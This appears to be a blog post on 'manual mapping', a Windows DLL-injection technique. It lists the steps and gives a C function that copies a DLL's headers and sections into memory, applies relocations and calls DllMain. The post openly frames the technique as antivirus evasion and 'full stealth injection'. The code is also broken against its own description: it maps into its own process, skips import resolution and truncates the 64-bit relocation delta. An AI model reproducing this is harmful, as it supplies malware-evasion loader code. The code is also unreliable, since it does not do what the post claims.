---
title: Manual mapping
published: 2026-04-20
tags: [Markdown, AntiVirus-Evasion, Malware]
category: AntiVirus-Evasion
draft: false
---

Manual mapping consists of these core steps:
1. Parse the PE file (DLL)
2. Allocate memory in the target process
3. Copy headers and sections to the allocated memory
4. Fix relocations if base address differs
5. Resolve imports manually
6. Call the entry point (e.g., DllMain) manually

Why?
- No call to LoadLibrary or LdrLoadDll → No DLL load event
- No use of the Import Address Table (IAT) → Bypasses import hooks
- Entry point is called manually → No loader callbacks like LdrpCallInitRoutine
- Can be injected via remote thread → Full stealth injection

```c title="ManualMap.c"
// Original source: redteamleaders.com
#include <Windows.h>
#include <iostream>
// This code is simplified and only works for basic, non-complex DLLs compiled as /ENTRY:DllMain.

bool ManualMap(BYTE* dllBuffer) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBuffer;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBuffer + dos->e_lfanew);

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    BYTE* remoteImage = (BYTE*)VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImage) return false;

    // Copy headers
    memcpy(remoteImage, dllBuffer, nt->OptionalHeader.SizeOfHeaders);

    // Copy sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        memcpy(remoteImage + section[i].VirtualAddress,
               dllBuffer + section[i].PointerToRawData,
               section[i].SizeOfRawData);
    }

    // Relocations (simplified: assumes IMAGE_REL_BASED_DIR64)
    DWORD delta = (DWORD_PTR)remoteImage - nt->OptionalHeader.ImageBase;
    if (delta) {
        IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size) {
            IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(remoteImage + relocDir.VirtualAddress);
            while (reloc->VirtualAddress) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* relocData = (WORD*)(reloc + 1);
                for (DWORD i = 0; i < count; i++) {
                    if ((relocData[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                        DWORD64* patch = (DWORD64*)(remoteImage + reloc->VirtualAddress + (relocData[i] & 0xFFF));
                        *patch += delta;
                    }
                }
                reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
            }
        }
    }

    // Entry point
    DWORD entryRVA = nt->OptionalHeader.AddressOfEntryPoint;
    auto DllMain = (BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID))(remoteImage + entryRVA);
    DllMain((HINSTANCE)remoteImage, DLL_PROCESS_ATTACH, NULL);

    return true;
}
```